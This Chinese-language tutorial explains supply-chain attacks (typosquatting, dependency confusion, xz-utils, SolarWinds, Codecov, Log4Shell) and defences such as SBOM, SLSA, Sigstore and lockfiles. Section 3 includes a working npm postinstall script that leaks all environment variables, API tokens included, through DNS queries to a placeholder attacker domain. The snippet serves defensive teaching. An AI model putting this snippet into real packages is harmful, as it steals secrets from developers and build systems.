# 供应链安全:npm/PyPI 投毒 / SBOM / Sigstore / SLSA

进入工程化防御这一层第一篇,**先扔出一个让所有"我代码没漏洞我就安全"的人会破防的事实**:**你不需要被打,只需要你依赖的人被打**。你审了自己的 10 万行代码,从 SAST 到 DAST 到渗透测试一个不落——然后 `npm install` 拉进来 1200 个包共 6 万个文件,这里面任何一个维护者的笔记本被打、任何一个 GitHub token 泄漏、任何一个域名续费忘了被人抢注,**你的代码再干净都没用**。SolarWinds 那年,18000 家企业被打——他们的代码全没问题,中招的是「他们装了 SolarWinds 的更新」这一个动作。**这就是 2020 年代以后 CISO 们集体睡不着觉的原因——攻击面从"我的代码"扩张到"整条软件供应链",每一个 transitive dependency 都是新攻击面**。

> 一句话先记住:**供应链安全的本质是"信任传递" —— 你 trust 的每一个东西,等于把它信任的所有东西也 trust 了**。npm 一个包平均依赖 80 个传递依赖,你只点了一下 install,实际上把 80 个陌生维护者放进了你的 CI / 生产环境。**SBOM 是"清单"(我装了什么)、SLSA 是"等级"(我怎么造的)、Sigstore 是"签名"(确认是 ta 造的)**——这三个 2022 年后的关键词,本质上都是在回答同一个问题:**这堆二进制 / 包,我凭什么信**。

---

## 一、漏洞为什么存在:开源生态的"信任默认值"是 0

### 1.1 三个让人脊背发凉的数字

- **NPM 注册表 ~310 万个包**,几乎全是无身份验证的 maintainer 上传上去的——**没有人审查你的代码**。
- **一个现代前端项目平均 1200+ 个传递依赖**,你能叫出名字的不超过 30 个。
- **2023 年发现的恶意 PyPI 包数量翻了 6 倍**,Sonatype 报告里光那一年就有 24.5 万个新增恶意包。

更让人沉默的是 left-pad 事件(2016):**一个 11 行代码的包,作者一气之下从 npm 删除,瞬间击穿了 React、Babel、Webpack 在内的几千个项目**——所有人当时才意识到「我们的 build 系统竟然依赖一个我连听都没听过的人的心情」。

### 1.2 为什么生态会演化成这样

开源不是为安全设计的——它是为「**最大化协作效率**」设计的。所有降低 friction 的设计在安全上都是反向的:

| 设计目标 | 实现 | 安全代价 |
| --- | --- | --- |
| 让人随时发布 | npm publish 一行命令 | 任何人可以塞任何代码 |
| 让人随时取消发布 | unpublish | left-pad,生态断链 |
| 让依赖自动解析 | semver `^` `~` | 维护者可以在 patch 版本里塞后门 |
| 让传递依赖透明 | 自动安装子依赖 | 6 万个文件你看都没看过 |
| 让 install 跑脚本 | postinstall 钩子 | npm install 等于 `bash arbitrary.sh` |

**这五个设计加起来,等于把每个开发者的笔记本变成"可远程触发的代码执行靶子"**——只要攻击者能让你 install 一次。

### 1.3 信任边界画错了

应用工程师脑里的边界图大概是这样:

```
[互联网] | [我的服务] | [我的 DB]
   ↑
我以为攻击面在这条线
```

实际的边界图:

```
[互联网] | [我的服务] | [我的 DB]
            ↑
            └── 但代码里 import 进来的 1200 个包是从这边进的:

  [npm/PyPI 注册表] → [maintainer 的 GitHub] → [maintainer 的笔记本]
       ↑                    ↑                       ↑
   被植入                被劫持                  被钓鱼
```

**任何一个上游节点被打,代码以"合法 update"的姿态进入你的 CI、你的镜像、你的生产环境**。Web 防御打了 30 年的入站防御,在供应链场景下**完全失效**——攻击是从「内部出站拉取」开始的,WAF / IDS 看不到。

## 二、攻击者怎么利用它:六种真实手法

供应链攻击不是一类漏洞,是**一整个攻击面**。下面六种手法是 2018 年后真实事件分类得出的,**每一种都至少出过一次年度大瓜**。

### 2.1 Typosquatting(域名/包名抢注)

```
正经包:           恶意包:
  requests           reqeusts(字母对调)
  lodash             lodahs
  python-dateutil    python-dateutil2
  cross-env          crossenv(没破折号)
```

你 `pip install` 手抖一下,装的就不是 requests 了。**2017 年 PyPI 上有人发布了几十个这种包,潜伏一年下载几十万次**,里面 setup.py 偷偷上传环境变量到攻击者服务器。

变种:**dependency confusion(2021,Alex Birsan)**——内部包名如果只在公司私服存在、没在公网注册,攻击者去 npm 公网注册同名包(版本号写超高),你 CI 的包管理器**优先取版本高的那个**,直接执行公网恶意代码。Microsoft、Apple、PayPal 几十家大厂都被这一招打穿过。

### 2.2 仓库劫持(account takeover)

**event-stream(2018)**——这个故事现在已经是供应链安全的教科书案例。背景:event-stream 是一个老 npm 包,周下载量数百万。原作者维护累了想退休,**有个陌生人发邮件说"我帮你维护吧"**,原作者把发布权限直接转过去了。新维护者悄悄加了一个新的子依赖 `flatmap-stream`,里面藏着一段加密的恶意代码,**只针对一个特定项目(Copay 比特币钱包)的环境激活**,激活后偷私钥。

这件事的可怕在于:**没有人发起攻击,这只是"权限转交"+"加一个子依赖"两个完全合法的动作**。从被打到被发现过了 3 个月。

类似:**ua-parser-js(2021)**——维护者邮箱被钓鱼,攻击者发布了三个含挖矿木马的版本,周下载量 800 万。

### 2.3 国家级潜伏:xz-utils 后门(CVE-2024-3094)

**2024 年最重磅、也是 2020 年代最像谍战小说的一次**。简化时间线:

```
2021  一个叫 "Jia Tan" 的账号开始给 xz-utils 提 PR
2022  原维护者(累了)开始让 Jia Tan 当 co-maintainer
2023  Jia Tan 成为事实上的主维护者
2024  3 月,xz 5.6.0 / 5.6.1 发布,里面藏后门:
      - 在 build 阶段从 .xz 测试文件里"解压出"恶意 m4 脚本
      - 该脚本在编译时把 liblzma 链接进 sshd
      - 在 sshd 收到特定签名的 payload 时绕过认证
2024  3 月 29 日,微软工程师 Andres Freund 发现 sshd 比平时慢 500ms,
      顺藤摸瓜挖出整套后门——离 Debian/Ubuntu 把这个版本推到稳定版还差几周
```

**这件事改变了所有人的认知**:
- 单人维护、被人格分裂操控、用 3 年潜伏期布的局,**社会工程优先于代码**。
- 后门**不在源码 tarball 里**——而是在「发布到 GitHub Release 的压缩包」里,这是**只有上传者本人能修改的版本**。**源代码审计永远找不到**。
- 触发条件极度刁钻,普通 fuzz / 静态分析无法发现。
- 发现纯靠**一次性能异常**(sshd 慢 500ms),不是任何安全产品功劳。

xz 之后,**所有"单人维护的底层依赖"都被认为是国家级 APT 的优先目标**——Linux 基金会和 Sovereign Tech Fund 已经开始有计划地资助"关键单人项目"加人手。

### 2.4 编译流程被植入:SolarWinds(2020)

不是包仓库被打,是**构建机器本身被打**。

```
攻击者入侵 SolarWinds 内网
  → 拿到 Orion 产品的 build server 权限
  → 改 build 流程:正常源码 + 一段叫 SUNBURST 的恶意 DLL 一起编译
  → 输出的二进制带正规 SolarWinds 代码签名(因为是从官方 build 出来的)
  → 通过 SolarWinds 的自动更新推到 18000 家客户
  → 包括美国财政部、国务院、国土安全部、FireEye 等等
```

**关键点**:客户做的所有事——验证 SolarWinds 签名、验证哈希、装在隔离网络——**全都是对的**,问题在源头。**签名只能告诉你"这是 SolarWinds 发的",不能告诉你"SolarWinds 没被打过"**。

这是 SLSA 后来要解决的核心问题:**怎么证明"从源码到二进制的过程没被篡改"**。

### 2.5 CI 凭证泄漏:Codecov(2021)

Codecov 提供一个 `bash <(curl -s https://codecov.io/bash)` 的 uploader,被 CI 集成在几万个仓库里。攻击者发现 Codecov 的 Docker 镜像里有一行 GCS 上传凭证,**改了一行 bash 脚本**:除了上传代码覆盖率,**还顺便把 CI 环境变量打包发到攻击者服务器**。CI 环境变量里平常有什么?**AWS key、GitHub token、数据库密码、npm publish token**。

后续多米诺骨牌:**Codecov 用户的 token 泄漏 → 这些用户上传到 npm / PyPI 的包被攻击者改 → 再下游成千上万个项目中招**。

**教训**:CI 是供应链中**密度最高的密钥集中地**,被打一次等于一片塌方。

### 2.6 不算后门、但是供应链放大的极致:Log4Shell(2021)

CVE-2021-44228 不是「Log4j 被植入」——是**Log4j 自己设计上有个二十年没人 care 的 JNDI lookup 功能,触发条件低到令人发指**(只要日志里出现 `${jndi:ldap://...}` 字符串)。这本身是个普通 RCE,**但它放大成全球危机**是供应链的事:

- Log4j 是 Java 生态的事实标准日志库,**几乎每个 Java 项目都依赖它**。
- 大量项目通过传递依赖引入,**很多团队连自己用了 Log4j 都不知道**。
- 第一次 patch 还有 bypass,出了 44228 → 45046 → 45105 一连串 CVE。

**Log4Shell 之后,SBOM 才真正从"合规要求"变成"出事时能救命的清单"**——你 12 月 10 日凌晨被叫醒,第一件事不是修,**是先问"我哪些服务用了 Log4j"**,没 SBOM 你根本答不出来。

## 三、最小复现:install 一个包就能拿到你 token

这一节只演示**一个 npm postinstall 钩子能干什么**——不教武器化,只让你直观地看到「**install 不是只下载文件,是执行代码**」这件事意味着什么。

### 3.1 一个会"自我介绍"的恶意包

恶意作者发布的 `package.json`:

```json
{
  "name": "left-pad-fix",
  "version": "1.0.1",
  "main": "index.js",
  "scripts": {
    "postinstall": "node ./postinstall.js"
  }
}
```

`postinstall.js`(简化到 5 行,真实武器化版本会做混淆 + 沙箱检测):

```js
// 把环境变量序列化、用 DNS query 慢慢外带
const dns = require('dns');
const env = Buffer.from(JSON.stringify(process.env)).toString('hex');
for (let i = 0; i < env.length; i += 60) {
  dns.lookup(`${env.slice(i, i+60)}.exfil.attacker.com`, () => {});
}
```

**就这五行**。你在 CI 上一次 `npm install`,**整个 `process.env`(包含 AWS_SECRET_ACCESS_KEY、NPM_TOKEN、GITHUB_TOKEN、DATABASE_URL)被 DNS 查询慢慢送出去**——还绕过出站防火墙(很多防火墙允许 DNS)。

### 3.2 这事可怕在哪

- **不需要漏洞**——npm 设计上 postinstall 就是给包用的合法机制。
- **不需要 maintainer 配合**——攻击者可以自己注册个 typosquatting 名字,坐等手抖。
- **CI 默认没沙箱**——root 跑 install,环境变量全裸。
- **HTTPS 看不到**——出站到 DNS / 攻击者 CDN,长得就跟正经 telemetry 一样。

**这就是为什么 2025 年「在 CI 上裸跑 npm install」已经被视作不可接受**——必须加缓存、加沙箱、加锁文件、加 audit。

## 四、怎么修:三件事,SBOM / SLSA / 签名

供应链问题的修法和普通漏洞不一样——**单点 patch 没用,必须从生态层面建立"信任基础设施"**。2022 年后业界形成共识的三件事:

### 4.1 SBOM:你必须知道你装了什么

SBOM(Software Bill of Materials,软件物料清单)就是**给每个软件附一张"配料表"**:用了什么开源、什么版本、什么 license、有没有已知 CVE。

```
名字            版本     license      来源              hash
log4j-core      2.14.1   Apache-2.0   maven central     sha256:...
left-pad        1.3.0    MIT          npm               sha256:...
openssl         3.0.7    Apache-2.0   apt(debian)       sha256:...
```

**两个事实标准格式**:

| 格式 | 出身 | 特点 |
| --- | --- | --- |
| SPDX | Linux 基金会 | 偏 license 合规,语义严格,xml/json/yaml/tag-value 多种序列化 |
| CycloneDX | OWASP | 偏安全,VEX(漏洞可利用性交换)集成更好,json/xml |

**生成工具**:`syft`(扫镜像/目录)、`cyclonedx-bom`、`spdx-tools`,几乎所有现代构建工具(maven、gradle、go build、cargo)都能产 SBOM。

> SBOM 不解决任何漏洞,**它只是让你在 Log4Shell 那种事件里能在 10 分钟内回答"我哪些服务受影响"**。没有 SBOM 你只能挨个 grep,Big Tech 当时几乎花了整周才把这事搞清楚。**2023 年 9 月之后,美国政府采购软件强制要求 SBOM**,这事从最佳实践变成法律义务。

### 4.2 SLSA:你必须能证明"怎么造出来的"

SLSA(Supply-chain Levels for Software Artifacts,读作 "salsa")是 Google 牵头、Linux 基金会托管的**构建过程成熟度等级**。**SBOM 回答"是什么",SLSA 回答"怎么来的"**。

```
L0  没要求 —— 自己 PC 上 build,谁也不知道发生了什么
L1  有构建文档 —— 至少能说清楚 build 怎么跑的
L2  托管 build + 签名 —— 用 GitHub Actions / Cloud Build 这种受控环境,产物有签名
L3  build 隔离 + 不可篡改 provenance —— build job 之间互相隔离,
    provenance(构建出处证明)由平台生成、无法被 build 脚本自己伪造
L4  双人审 + 可重现 build —— 任何代码改动两人 review,任何人都能从源码构出 byte-identical 的产物
```

**SLSA 的设计动机就是 SolarWinds**。SolarWinds 当年的 build server 没有 isolation、没有 provenance、攻击者改了 build 脚本没人知道——**那就是 SLSA L1 或更低**。如果当时已经是 L3:provenance 会显示「构建用的源码 commit 是 abc123,但 abc123 的 git tree 里**没有** SUNBURST 这段代码」,矛盾立刻暴露。

落地一句话:**用 GitHub Actions / GitLab CI 跑构建、产物用 sigstore 签 + 用 SLSA Provenance generator 生成出处证明**——开箱即用大概到 L3。

### 4.3 Sigstore:每个产物都签名,但不用自己管私钥

代码签名这事 30 年了——但传统签名(GPG / Authenticode)有个致命问题:**得管私钥**。一个 npm 包作者要管自己的 PGP key,99% 的人弄不明白也懒得弄,所以 npm 包**绝大多数没签名**。

Sigstore(2021,Linux 基金会)的颠覆式设计是 **keyless signing**:

```
                ┌────────────────────────────────┐
                │  OIDC IdP(GitHub/Google)       │
                │  "你的确是 alice@example.com"     │
                └──────────────┬──────────────────┘
                               │ ID Token
                               ↓
[作者 build 完产物]    Fulcio:"用这个身份签,我给你发个 10 分钟有效的短证书"
        │              ────────────────────────
        │              cosign:"用短证书把产物哈希签了"
        │              Rekor:"我把这次签名记进透明日志"
        ↓
   sig.json (产物 hash + 短证书 + 透明日志 index)
```

三个组件分工:

- **Fulcio**:看到你的 OIDC token 就给你发个**只能用一次、10 分钟过期**的证书——**根本没有"长期私钥"需要保管**。
- **cosign**:用这张短证书签产物哈希。
- **Rekor**:把所有签名记录在一个**只追加、可公开审计的透明日志**里(类似 Certificate Transparency)。

**验证方**只要知道「这个产物的发布者应该是 `release-bot@kubernetes.io`」就能去 Rekor 验证签名,**不需要预先信任任何长期公钥**。GitHub、PyPI、npm、Kubernetes、Sigstore 自己都已经全面接入——`pip install --require-hashes` 那种笨办法的时代该结束了。

**Rekor 透明日志为什么重要**:它是个**全球公开、只追加、Merkle 树构造的日志**,所有 Sigstore 签名都会进。意味着——攻击者就算偷到了某个 OIDC 身份,**他签发的所有恶意产物都会留下永久公开痕迹**,事后清算可以做到分钟级精确。**传统签名机制下,恶意签名是"无声的";Sigstore 下,恶意签名是"自带证据链的"**——这是 2010 年代 Certificate Transparency 给 TLS 带来的同款革命,只是换到了软件产物上。

### 4.4 镜像供应链:Docker / OCI 这一层

容器化让供应链问题**翻了一倍**——你的产物现在不只是「编译出来的二进制」,还有「base image + 所有 apt/apk 装的包 + 复制进来的所有文件」。常见的几个坑:

```dockerfile
FROM python:3.11           # ← 坏:tag 会漂移,今天的 3.11 和明天的 3.11 不一样
FROM python:3.11-slim      # ← 还是坏:同上
FROM python:3.11.7-slim    # ← 好一点,但底层 debian 系统仍可能变
FROM python:3.11.7-slim@sha256:5f8d...   # ← 才叫真正 pin 住
```

| 坑 | 实际危险 |
| --- | --- |
| `:latest` / 不带 digest | 上游推个被 typosquat 的版本你就跟着推到生产 |
| build 时 `RUN curl|bash` | 把 SLSA L0 嵌进了你的 SLSA L3 流程,木桶最短板 |
| `RUN apt-get install xxx` 不固定版本 | base 系统 CVE 状态每天都在变,镜像不可重现 |
| 跑 root | 容器逃逸时和原生进程一样危险 |
| 用别人的 entrypoint.sh | 等同信任 base image 维护者 |

**修法**:
1. **Distroless / chainguard / wolfi** 这类「无 shell、无 package manager、无 root」的极简 base,**攻击面砍掉 90%**。
2. 多阶段 build:**build 用 fat image,run 用 distroless**,**最终镜像不带编译工具链**。
3. CI 加 `trivy image` / `grype` 扫,critical 直接 fail pipeline。
4. **镜像签名**:用 cosign 给 OCI 镜像签,K8s 部署时用 Sigstore policy controller 验证——**没签名的镜像不允许调度**,这是 K8s 集群级的"零信任供应链"。

### 4.5 三件套放一起看

```
              ┌─────────────────────────────────────────┐
              │      "这个产物我凭什么信"                │
              └────────────┬────────────────────────────┘
                           ↓
        ┌──────────────────┼──────────────────┐
        ↓                  ↓                  ↓
    [SBOM]              [SLSA]            [Sigstore]
   是什么              怎么造的            谁造的
  ─────────         ─────────         ─────────
  配料表            构建出处证明        身份签名
  spdx/cyclonedx    L0~L4              keyless
  syft 生成         provenance          cosign + Rekor
  ─────────         ─────────         ─────────
  出事时            预防 SolarWinds     预防恶意发布
  能 grep           式 build 攻击       能事后追责
```

三者**叠加**才形成完整链条——SBOM 告诉你装了什么、SLSA 告诉你怎么造的、Sigstore 让两者都不可抵赖。**任何一件单做都不够**:只有 SBOM 没签名,SBOM 本身可以被改;只有 SLSA 没 SBOM,出事时找不到受影响范围;只有 Sigstore 没 SLSA,签名 OK 但 build 流程被打你查不到。

### 4.6 锁文件与依赖审计:工程师每天能做的最小动作

不上 SLSA / Sigstore 之前,先把**锁文件**和**审计**做到位。

| 语言 | 锁文件 | 审计 |
| --- | --- | --- |
| Node.js | package-lock.json / pnpm-lock.yaml | `npm audit` / `pnpm audit` |
| Python | poetry.lock / uv.lock / pip-tools | `pip-audit` / `safety check` |
| Go | go.sum(自带) | `govulncheck`(官方) |
| Rust | Cargo.lock | `cargo audit` |
| Java | maven 没自带锁,需 `maven-lockfile` 插件 | OWASP Dependency-Check |

锁文件的核心作用:**钉死每个依赖的 hash**——下次 install 只要 hash 对不上立刻报错。`npm ci`(注意是 ci 不是 install)就是**严格按锁文件 install,不允许漂移**——CI 里必须用这个,不能用 `npm install`。

**Dependabot / Renovate** 是另一面:**定期检查锁文件里的包有没有新 CVE**,自动开 PR 升级版本。这俩免费,GitHub 开个开关的事,**不开是工程纪律问题**。

## 五、纵深防御:小公司能做的最小加固清单

供应链是**没有止境的话题**——大厂可以全套 SLSA L3、私有镜像 mirror、artifact 签名验证、build farm 隔离——小公司做不了那么重。下面是**人手不足 10 人的团队,真实能做且 ROI 最高的 12 件事**,按优先级排:

```
P0(本周必须做完):
  1. 所有项目锁文件 commit 到 git,CI 用 npm ci / pip install --require-hashes
  2. 开启 Dependabot / Renovate,每周看一次 PR
  3. CI secrets 走 OIDC,不要长期 token;npm publish 走 npm provenance(免费)
  4. 删掉所有 curl|bash 的 install 步骤,换成 pin 住 hash 的固定版本

P1(本月做完):
  5. 给 Docker 基础镜像 pin 住 digest(@sha256:abc...),不要用 :latest 也不要用 :3.11
  6. 用 syft 给每个产物生成 SBOM,扔到产物里一起发布
  7. 用 grype / trivy 在 CI 里扫镜像 CVE,有 critical 就 fail
  8. npm/PyPI 私服(verdaccio / Artifactory / nexus)+ proxy 模式
     —— 至少所有依赖经过你的缓存,不会因为上游消失断链

P2(下季度):
  9. 引入 cosign 给自家产物签名(无私钥,免费)
  10. CI 跑在隔离 runner 上,build job 之间不共享凭证
  11. 关键依赖建立"白名单"——非白名单的新依赖,review 才能进
  12. 给所有 maintainer 强制 2FA / hardware key(GitHub / npm / PyPI 都支持)
```

特别提醒几个**容易忘的高危点**:

- **IDE 插件也是供应链**。VS Code 扩展商店历史上多次出过恶意扩展,你的 cursor / vscode 里几十个插件,每一个都能读你所有打开的文件、所有环境变量。**只装大厂或者社区头部的插件**,别看到 star 不多的就装。
- **Docker base image 上游也会消失**。Docker Hub 已经多次清理"不活跃账户"的镜像,你的 `FROM somebody/python:3.11` 哪天突然不见,build 直接挂。**关键镜像复制到自己仓库**。
- **`curl https://get.docker.com | sh` 这种命令本质上是 SLSA L0**。安装脚本服务端今天给的是干净版本,明天给被改的版本,**没有任何机制能让你发现**。能下离线包就下离线包,能 pin 就 pin。
- **GitHub Actions 第三方 action 是一类被低估的供应链**。一个 `uses: somebody/setup-foo@main` 等于在 CI 里执行任意 JS,而且能拿到 `GITHUB_TOKEN`。**`@main` 改成 `@<commit-sha>` 这一条改完,你的攻击面立刻砍掉 60%**——commit hash 不可篡改,tag 和 branch 都可以被维护者重指。

> **真正的"安全意识"不是装更多工具,是改默认值**——npm install 改 npm ci、:latest 改 @sha256、@main 改 @commit-sha、curl|bash 改 pinned binary。每一处默认值的修改,都是把"被未来某天上游被打"的概率往零按一点。**供应链这事永远不会"做完",只能"持续把 ROI 高的洞先堵上"**。

## 六、踩坑提醒(供应链版)

1. **以为「我用的是大厂的包,所以安全」**——left-pad、event-stream、ua-parser-js 当时都是"大厂在用"。
2. **以为锁文件 = 安全**——锁文件只防"下次 install 漂移",不防"今天 install 装到恶意版本"。
3. **以为 npm audit 没告警就没事**——npm audit 只覆盖**已知 CVE**,2024 年的 xz 后门在被发现前 npm audit 不会有任何反应。
4. **以为 Docker `:latest` 是最新就是最安全**——`:latest` 是**可漂移**的 tag,昨天和今天的 latest 可能完全不同。要 pin 的是 digest(sha256)。
5. **以为内部包名安全**——dependency confusion 已经吃掉过无数大厂,**所有内部 scope 必须在公网占位注册**。
6. **以为只有 CI 是攻击面**——开发者的笔记本上跑的 `npm install` 一样会执行 postinstall,**本地凭证(SSH key、~/.aws/credentials)一样会泄漏**。
7. **以为 SBOM 是合规义务、生成完就完了**——SBOM 的价值在"出事时能 grep",平时要把它和 CVE 数据库(OSV、NVD)做关联。
8. **以为代码签名能解决供应链**——SolarWinds 的恶意 DLL 是合法签名的,签名只能保证"是它发的",不能保证"它没被打"。
9. **以为换成 Go / Rust 这种"少依赖"语言就没事**——Cargo 生态依赖一样很深,**Go 标准库本身就是国家级 APT 的优先目标**(2024 年 Go 团队抓过几次 GoProxy 投毒尝试)。
10. **以为「我们公司太小不会被针对」**——错。供应链攻击是**广撒网**模型,攻击者发个 typosquatting 包等你手抖,**不挑公司大小**。
